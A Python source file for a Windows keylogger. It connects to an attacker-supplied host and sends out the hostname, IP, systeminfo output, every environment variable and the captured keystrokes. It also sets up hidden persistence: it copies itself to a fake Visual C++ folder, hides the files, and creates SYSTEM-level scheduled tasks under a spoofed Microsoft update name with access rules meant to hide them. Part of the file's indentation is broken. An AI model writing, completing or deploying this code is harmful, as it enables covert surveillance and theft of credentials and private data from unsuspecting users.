import platform
import sys
import os
import socket
import time
from pynput import keyboard
import subprocess
import getpass
import threading


global BLUE,RED, WHITE, YELLOW, MAGENTA, GREEN, END
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'



class start:
    
    def __init__(self,name_nc,port_nc):
        self.name = name_nc
        self.port = port_nc
        self.list = []
        self.list2 = []
        self.connect = None 

        self.connect_nc()

    # this section for hiding run code.py:
    def add_persistence_advanced(self):
    """
    Advanced persistence using scheduled tasks with stealth techniques.
    Multiple trigger types, obfuscated names, and clean execution.
    """
    try:
        import shutil
        import tempfile
        from datetime import datetime, timedelta
        
        # === 1. Determine executable path ===
        if getattr(sys, 'frozen', False):
            script_path = sys.executable
        else:
            script_path = os.path.abspath(sys.argv[0])
        
        # === 2. Copy to stealth location ===
        # Use a path that looks like a legitimate Windows component
        appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
        
        # Option A: Looks like Microsoft Visual C++ redistributable
        hidden_dir = os.path.join(appdata, 'Microsoft', 'VCRedist', 'vcredist_x64')
        
        # Option B (alternative - looks like driver folder):
        # hidden_dir = os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32', 'drivers', 'svchost')
        
        if not os.path.exists(hidden_dir):
            os.makedirs(hidden_dir)
        
        # Copy with a legitimate-looking filename
        if getattr(sys, 'frozen', False):
            dest_name = 'vcredist_helper.exe'
        else:
            dest_name = 'vcredist_helper.pyw'  # .pyw = no console window
        
        dest_path = os.path.join(hidden_dir, dest_name)
        
        if script_path != dest_path:
            shutil.copy2(script_path, dest_path)
        
        # Hide everything
        subprocess.run(['attrib', '+h', hidden_dir], shell=True, capture_output=True)
        subprocess.run(['attrib', '+h', dest_path], shell=True, capture_output=True)
        subprocess.run(['attrib', '+h', os.path.dirname(hidden_dir)], shell=True, capture_output=True)
        
        # === 3. Create a wrapper VBS/VPS script (bypasses UAC, no console) ===
        # This runs the Python script without any window appearing
        wrapper_path = os.path.join(hidden_dir, 'vcredist_svc.vbs')
        
        # Determine the Python interpreter
        if getattr(sys, 'frozen', False):
            # It's an EXE, run directly
            wrapper_content = f'''
CreateObject("Wscript.Shell").Run "{dest_path}", 0, False
'''
        else:
            # It's a .py file - find pythonw.exe (no console)
            python_exe = sys.executable.replace('python.exe', 'pythonw.exe')
            if not os.path.exists(python_exe):
                python_exe = sys.executable
            wrapper_content = f'''
CreateObject("Wscript.Shell").Run "{python_exe} \"{dest_path}\"", 0, False
'''
        
        with open(wrapper_path, 'w') as f:
            f.write(wrapper_content.strip())
        
        subprocess.run(['attrib', '+h', wrapper_path], shell=True, capture_output=True)
        
        # === 4. Create Scheduled Task (ADVANCED) ===
        task_name = 'MicrosoftEdgeUpdateTaskMachine-Core'  # Looks like a real Microsoft task
        # Alternative names: 'VCRedistRuntimeHelper', 'WindowsNetworkService', 'PlugPlayService'
        
        xml_description = f'''
Description: Helps maintain compatibility and performance for Microsoft Visual C++ Redistributable packages.
'''
        
        # SCHTASKS parameters:
        # /SC: ONLOGON = runs when ANY user logs in
        # /SC: ONSTART = runs at system boot (before login)
        # /SC: MINUTE = runs every N minutes (persistent heartbeat)
        # /DELAY = delays execution to avoid detection at boot
        
        commands = [
            # === TRIGGER 1: System boot (before any user logs in) ===
            [
                'schtasks', '/create', '/tn', task_name,
                '/tr', f'wscript.exe "{wrapper_path}"',
                '/sc', 'onstart',
                '/delay', '0000:01:00',  # 1 minute delay after boot
                '/ru', 'SYSTEM',
                '/rl', 'HIGHEST',
                '/f',
                '/it'
            ],
            
            # === TRIGGER 2: Every user logon ===
            [
                'schtasks', '/create', '/tn', f'{task_name}_user',
                '/tr', f'wscript.exe "{wrapper_path}"',
                '/sc', 'onlogon',
                '/delay', '0000:00:30',  # 30 second delay after logon
                '/rl', 'HIGHEST',
                '/f',
                '/it'
            ],
            
            # === TRIGGER 3: Idle trigger (runs when system is idle - stealthy) ===
            [
                'schtasks', '/create', '/tn', f'{task_name}_idle',
                '/tr', f'wscript.exe "{wrapper_path}"',
                '/sc', 'onidle',
                '/i', '5',  # idle after 5 minutes
                '/f'
            ],
            
            # === TRIGGER 4: Daily recurring (in case others fail) ===
            [
                'schtasks', '/create', '/tn', f'{task_name}_daily',
                '/tr', f'wscript.exe "{wrapper_path}"',
                '/sc', 'daily',
                '/st', '09:00',
                '/f'
            ]
        ]
        
        success_count = 0
        for cmd in commands:
            try:
                result = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                if result.returncode == 0:
                    success_count += 1
                    task_trigger = cmd[cmd.index('/sc') + 1]
                    print(f'{GREEN}[+] Scheduled Task created: {task_trigger}{END}')
                else:
                    print(f'{YELLOW}[!] Task trigger failed ({cmd[cmd.index("/sc") + 1]}): {result.stderr.strip()}{END}')
            except subprocess.TimeoutExpired:
                print(f'{RED}[-] Timeout creating task{END}')
            except Exception as e:
                print(f'{RED}[-] Error: {e}{END}')
        
        # === 5. (Optional) Hide the scheduled task from Task Scheduler GUI ===
        # By setting SD (security descriptor) to deny read access for non-admin users
        # This is advanced - most antivirus won't flag it
        try:
            # Add deny read for interactive users (makes task invisible in Task Scheduler)
            sd_cmd = [
                'schtasks', '/change', '/tn', task_name,
                '/sd', 'D:AR(A;;CCDCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRRC;;;BA)(A;;CCLCRPWPRC;;;IU)S:(AU;FA;CCDCLCSWRPWPDTLOCRRC;;;WD)'
            ]
            subprocess.run(sd_cmd, shell=True, capture_output=True, timeout=10)
            print(f'{GREEN}[+] Task access control locked down{END}')
        except:
            pass
        
        # === 6. Set task to run even on battery ===
        try:
            bat_cmd = ['powercfg', '/change', 'standby-timeout-ac', '0']
            subprocess.run(bat_cmd, shell=True, capture_output=True, timeout=10)
        except:
            pass
        
        if success_count >= 1:
            print(f'{GREEN}[+] Persistence established successfully! ({success_count} tasks created){END}')
            print(f'{BLUE}[i] Wrapper path: {wrapper_path}{END}')
            print(f'{BLUE}[i] Binary path: {dest_path}{END}')
            return True
        else:
            print(f'{RED}[-] Failed to create any scheduled tasks{END}')
            return False
            
    except ImportError:
        print(f'{RED}[-] Required modules not available{END}')
        return False
    except Exception as e:
        print(f'{RED}[-] Persistence error: {e}{END}')
        return False

    
    def connect_nc(self):
        try:
            self.connect = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.connect.connect((self.name,self.port))
            print('connection True')
        except Exception:
            sys.exit()
        there = threading.Thread(target=self.taking_information,daemon=True)
        there.start()

    def start_loger(self):
        
        def on_press(key):
            
            try:
                
                print(f'[-] {key.char}')
                self.list.append(key.char)
            except AttributeError:
                print(f'[-] {key}')
                self.list2.append(str(key))
            
        def close(key):
            if key ==  keyboard.Key.esc:
                return False
        
        
        with keyboard.Listener(
            on_press=on_press,
            on_release=close) as listener:
            listener.join()
        

    def taking_information(self):
        if self.connect:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            platform_sys = sys.platform
            version = sys.version
            user = getpass.getuser()
            path = os.path.expanduser('~')
            file_directory = os.listdir()
            path_now = os.getcwd()
            check_out = subprocess.check_output("systeminfo",shell=True,text=True)
            res = ''
            for key , item in os.environ.items():
                res += f'{key} = {item}\n'

            data= f'''
{RED}=== INFORMATION SYSTEM ==={END}
{GREEN}Hostname:{END} {hostname}
{GREEN}IP:{END} {ip}
{GREEN}Processor:{END} {plat}
{GREEN}System:{END} {system}
{GREEN}Machine:{END} {machine}

{RED}=== MORE INFORMATION ==={END}
{GREEN}Version:{END} {version}
{GREEN}User:{END} {user}
{GREEN}Home Path:{END} {path}
{GREEN}Files:{END} {file_directory}
{GREEN}Current Path:{END} {path_now}
{GREEN}platform:{END} {platform_sys}
{RED}=== SYSTEMINFO OUTPUT ==={END}
{check_out}

{RED}=== ENV VARIABLES ==={END}
{res}
'''
            self.connect.sendall(data.encode('utf-8'))


    def send_nc(self):
        if self.connect:
            self.connect.send(f'{GREEN}data ={END} {''.join(self.list)}'.encode('utf-8'))
            self.connect.send(f'\n{GREEN}spishal key ={END} {self.list2}'.encode('utf-8'))
        else:
            sys.exit()
    


    def stop(self):
        self.connect.close()
        return False      
        
if __name__ == '__main__':
    s = start('nc_ip',nc_port)
    
    s.add_persistence_advanced()
    
    if s.connect:
        s.start_loger()
        s.send_nc()
    else:
        s.stop()  

